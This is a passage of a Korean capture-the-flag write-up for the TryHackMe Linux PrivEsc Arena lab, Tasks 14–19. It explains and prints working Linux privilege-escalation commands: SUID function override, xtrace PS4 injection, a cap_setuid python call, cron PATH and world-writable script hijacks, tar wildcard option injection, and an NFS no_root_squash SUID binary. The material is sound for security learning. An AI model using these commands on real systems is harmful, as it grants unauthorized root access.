strings /usr/local/bin/suid-env2
# suid-env2 내부에서 어떤 명령어를 호출하는지 확인
# 절대경로로 호출하는지 확인
```
**결과:**
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/43.png)
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/44.png)
명령어 실행 결과 이전 Task와는 다르게 절대 경로가 지정되어 있다
따라서 PATH 조작이 불가능하므로 함수 덮어쓰기와 bash 디버그 모드 두 가지 방법으로 root 셸을 획득한다
**명령어(방법 1 - 함수 덮어쓰기):**
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
# /usr/sbin/service 이름의 함수 생성
# 리눅스 실행 우선순위: 함수 → 별칭 → 파일
# 동일한 이름의 함수가 있으면 실제 파일보다 함수를 먼저 실행함

export -f /usr/sbin/service
# 생성한 함수를 자식 프로세스(suid-env2)까지 전달
# export -f 없으면 suid-env2가 함수를 인식하지 못함

/usr/local/bin/suid-env2
# suid-env2 실행 → /usr/sbin/service 호출 → 우리 함수 실행 → root 셸 획득

id
# root 권한 확인
```
**결과:**
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/45.png)
명령어 실행 결과 완전한 root 권한(uid + euid)을 획득 하였다
**명령어(방법 2 - bash 디버그 모드):**
```bash
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp && chown root.root /tmp/bash && chmod +s /tmp/bash)' /bin/sh -c '/usr/local/bin/suid-env2; set +x; /tmp/bash -p'
# bash 디버그 모드(xtrace)를 이용해 명령어 실행 전 악성 코드 삽입

id
# root 권한 확인
```
**결과:**
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/46.png)
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/47.png)
명령어 실행 결과 root 실행 권한(euid)을 얻을 수 있었다
**정답:**
```bash
1.What is the last line of the strings output?
#/usr/sbin/service apache2 start
```
### \[ Task15 - Privilege Escalation - Capabilities\]
Task15에서는 Linux Capabilities를 이용해 root 셸을 획득하는 것을 목표로 한다
관리자가 python2.6에 cap_setuid 권한을 부여했다고 가정한다
cap_setuid는 UID를 변경할 수 있는 권한이므로 Python에서 os.setuid(0)을 호출하면 UID를 root(0)으로 변경할 수 있다
UID가 0이 되면 완전한 root 권한을 가지게 되므로 이후 /bin/bash를 실행하면 root 셸을 획득할 수 있다
※ Capabilities는 root 권한을 세분화하여 필요한 권한만 선택적으로 부여할 수 있도록 하는 기능이다
**명령어:**
```bash
getcap -r / 2>/dev/null
# 시스템 전체에서 capabilities 설정된 파일 확인
# cap_setuid 권한이 있는 파일 경로 확인

<getcap 결과에서 cap_setuid 권한을 가진 파일 경로> -c 'import os; os.setuid(0); os.system("/bin/bash")'
# getcap 결과에서 cap_setuid+ep 가 설정된 python 경로로 실행
# os.setuid(0) → uid를 root(0)으로 변경
# os.system("/bin/bash") → root 셸 실행

id
# root 권한 확인
```
**결과:**
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/48.png)
실행 결과 성공적으로 root 셸을 획득 하였다
### \[ Task16 - Privilege Escalation - Cron (Path) \]
Task16에선 Cron Job의 Path 취약점을 이용한 root 권한 획득이 목표이다
Cron Job은 특정 시간마다 자동으로 실행되는 예약 작업이다
만약 Crontab Path에 쓰기 가능한 경로와 그 경로에 cron이 실행하려는 스크립트 이름과 동일한 파일을 넣을 수 있다면 cron이 root 권한으로 악성 스크립트를 실행하여 root 셸을 획득할 수 있다
**명령어:**
```bash
cat /etc/crontab
# cron 설정 확인
# PATH 변수 확인
# 어떤 스크립트가 실행되는지 확인
```
**결과:**
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/49.png)
PATH에 /home/user가 있어 일반 유저 권한으로 쓰기가 가능하다
다음으로 악성 스트립트를 작성하여 실행 권한을 부여해주면 매분 root 권한으로 실행되는 overwrite.sh가 PATH 탐색 시 /home/user/overwrite.sh를 먼저 발견하여 악성 스크립트를 root 권한으로 실행하게 된다
**명령어:**
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
# /home/user에 악성 overwrite.sh 작성
# cron이 PATH 탐색 시 /home/user/overwrite.sh를 먼저 발견

chmod +x /home/user/overwrite.sh
# 실행 권한 부여

# 1분 대기 후

/tmp/bash -p
# SUID 설정된 bash 실행 → root 셸

id
# root 권한 확인
```
**결과:**
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/50.png)
명령어 실행 결과 root 셸을 획득하였다
### \[ Task17 - Privilege Escalation - Cron (Wildcards)\]
Task17에선 tar 명령어의 와일드카드 취약점을 이용해 root 셸을 획득하는 것이 목표이다
cron이 매분 root 권한으로 compress.sh를 실행하는데 compress.sh 내부에서 tar가 /home/user/\* 와일드카드로 파일을 처리한다
tar는 파일 이름과 옵션을 구분하지 못하기 때문에 파일 이름을 --checkpoint=1 과 --checkpoint-action=exec=sh runme.sh 처럼 tar 옵션 형태로 만들면 tar가 이를 옵션으로 인식하여 root 권한으로 runme.sh를 실행하게 된다
( 실전에서는 먼저 cat /etc/crontab으로 cron 설정을 확인하고 절대경로 없이 실행되는 스크립트나 와일드카드를 사용하는 스크립트를 찾는다 이후 해당 스크립트의 내용을 확인하여 tar 와일드카드 취약점이 존재하는지 확인하고 쓰기 가능한 디렉토리에 악성 스크립트와 트리거 파일을 생성하여 cron이 실행될 때까지 대기한다)
**명령어:**
```bash
cat /etc/crontab
# cron 설정 확인
# 절대경로 없이 실행되는 스크립트 및 와일드카드 사용 스크립트 확인

cat /usr/local/bin/compress.sh
# compress.sh 내용 확인
# tar 와일드카드(*) 확인
```
**결과:**
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/51.png)
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/52.png)
명령어 실행 결과 매분 root 권한으로 compress.sh 실행하는 것을 확인 하였고 compress.sh 내부에서 tar가 /home/user/\* 와일드카드로 파일을 처리하는 것을 확인하였다
또한 /home/user 는 쓰기 가능한 디렉토리이므로 --checkpoint=1 과 --checkpoint-action=exec=sh runme.sh 이름의 파일을 생성하면 tar가 이를 옵션으로 인식하여 root 권한으로 runme.sh를 실행하게 된다
**명령어:**
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/runme.sh
# 악성 스크립트 작성

chmod +x /home/user/runme.sh
# 실행 권한 부여

touch /home/user/--checkpoint=1
# tar가 옵션으로 인식하는 파일 생성

touch '/home/user/--checkpoint-action=exec=sh runme.sh'
# 체크포인트 실행 시 runme.sh 실행하는 옵션 파일 생성

# 1분 대기 후

/tmp/bash -p
# SUID 설정된 bash 실행 → root 셸

id
# root 권한 확인
```
**결과:**
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/53.png)
실행 결과 root 셸 획득에 성공하였다
### \[ Task18 - Privilege Escalation - Cron (file Overwrite)\]
Task18에선 Task16과는 다르게 overwrite.sh 파일 자체를 수정해서 root 셸을 획득하는 것이 목표이다
cron이 실행하는 스크립트 파일의 권한이 -rwxrwxrwx 로 잘못 설정되어 있을 경우 일반 유저도 파일을 수정할 수 있다 이를 이용해 악성 코드를 직접 추가하면 cron이 매분 root 권한으로 해당 스크립트를 실행할 때 악성 코드도 함께 실행되어 root 셸을 획득할 수 있다
※ 정상적인 권한은 -rwxr-xr-x 로 소유자만 쓰기 가능해야 한다
**명령어:**
```bash
cat /etc/crontab
# cron 설정 확인

ls -l /usr/local/bin/overwrite.sh
# overwrite.sh 파일 권한 확인
# 일반 유저가 쓰기 가능한지 확인
```
**결과:**
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/54.png)
명령어 실행 결과 /usr/local/bin/overwrite.sh 파일이 일반 유저 권한으로 쓰기 가능하다는 것을 확인 하였다
또한 overwrite.sh 파일에 cp /bin/bash /tmp/bash; chmod +s /tmp/bash 명령을 삽입하고 root 권한으로 실행되는 cron job이 해당 스크립트를 실행하면 SUID 비트가 설정된 bash 바이너리가 /tmp에 생성된다
이후 /tmp/bash -p 실행 시 root 셸 획득이 가능하다
**명령어:**
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /usr/local/bin/overwrite.sh
# overwrite.sh에 악성 코드 추가
# >> = 파일에 내용 추가 (덮어쓰기 아님)
# 1분 대기 후

/tmp/bash -p
# root 셸 실행

id
# root 권한 확인
```
**결과:**
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/55.png)
실행 결과 root 셸을 성공적으로 획득 하였다
### \[ Task19 - Privilege Escalation - NFS Root Squashing\]
마지막 Task19에선 NFS의 no_root_squash 취약점을 이용한 root 권한 획득이 목표이다
NFS는 네트워크를 통해 다른 서버의 디렉토리를 내 컴퓨터에 마운트해서 사용하는 프로토콜로no_root_squash는 NFS 프로토콜의 옵션 중 하나이다
기본값인 root_squash일 땐 클라이언트에서 root로 접근해도 서버에서 권한을 낮추지만 no_root_squash로 설정되어 있으면 클라이언트의 root 권한이 서버에서도 그대로 인식된다
해당 옵션은 신뢰할 수 있는 내부 네트워크 환경에서만 사용해야 하지만 외부에 노출된 환경에서 사용할 경우 공격자가 클라이언트의 root 권한으로 악성 파일을 생성하여 서버에서 root 셸을 획득할 수 있다
### **(GLIBC 버전이 맞는 경우)**
**명령어(kali):**
```bash
showmount -e <타겟IP>
# NFS 마운트 가능한 디렉토리 확인

mkdir <마운트경로>
# 마운트할 디렉토리 생성

mount -o rw,vers=3 <타겟IP>:<공유디렉토리> <마운트경로>
# 타겟 서버의 공유 디렉토리를 Kali에 마운트

echo '#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > <마운트경로>/y.c
# 악성 코드 작성

gcc <마운트경로>/y.c -o <마운트경로>/y
# Kali에서 직접 컴파일

chmod +s <마운트경로>/y
# SUID 설정 (no_root_squash로 인해 타겟 서버에서도 root 소유로 인식)

ls -la <마운트경로>/y
# -rwsr-sr-x 1 root root 확인
```
**명령어(서버 셸):**
```bash
<공유디렉토리>/y
# 악성 파일 실행

id
# root 권한 확인
```
### **(GLIBC 버전이 다른 경우)**
**명령어(kali):**
```bash
showmount -e <타겟IP>
# NFS 마운트 가능한 디렉토리 확인
```
**결과:**
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/56.png)
디렉토리 확인 결과 /tmp가 모든 클라이언트에서 접근 가능한 것을 확인했다
※ \* = 특정 클라이언트로 제한하지 않고 모든 클라이언트에게 공유된 상태
다음으로 Kali에서 타겟 서버의 /tmp를 마운트한 뒤 악성 파일을 생성하고 SUID를 설정한다 Kali는 root 권한으로 실행 중이므로 no_root_squash 설정에 의해 타겟 서버에서도 root 소유 파일로 인식된다
따라서 타겟 서버에서 해당 파일을 실행하면 SUID에 의해 root 권한으로 실행되어 root 셸을 획득할 수 있다
**명령어(칼리):**
```bash
mkdir <마운트경로>
# 마운트할 디렉토리 생성

mount -o rw,vers=3 <타겟IP>:<공유디렉토리> <마운트경로>
# 타겟 서버의 공유 디렉토리를 Kali에 마운트

echo '#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > <마운트경로>/y.c
# 악성 코드 작성

chmod 777 <마운트경로>/y.c
# debian에서 컴파일 가능하도록 권한 부여
```
**결과:**
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/57.png)
**명령어(서버 셸):**
```bash
gcc <공유디렉토리>/y.c -o <공유디렉토리>/y
# 타겟 서버에서 직접 컴파일 (GLIBC 버전 문제 해결)
```
**결과:**
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/58.png)
**명령어(kali):**
```bash
chown root:root <마운트경로>/y
# 소유자를 root로 변경

chmod +s <마운트경로>/y
# SUID 설정 (no_root_squash로 인해 타겟 서버에서도 root 소유로 인식)

ls -la <마운트경로>/y
# -rwsr-sr-x 1 root root 확인
```
**결과:**
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/59.png)
**명령어(서버 셸):**
```bash
<공유디렉토리>/y
# 악성 파일 실행

id
# root 권한 확인
```
**결과:**
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/60.png)
실행 결과 root 셸을 획득 할 수 있었다
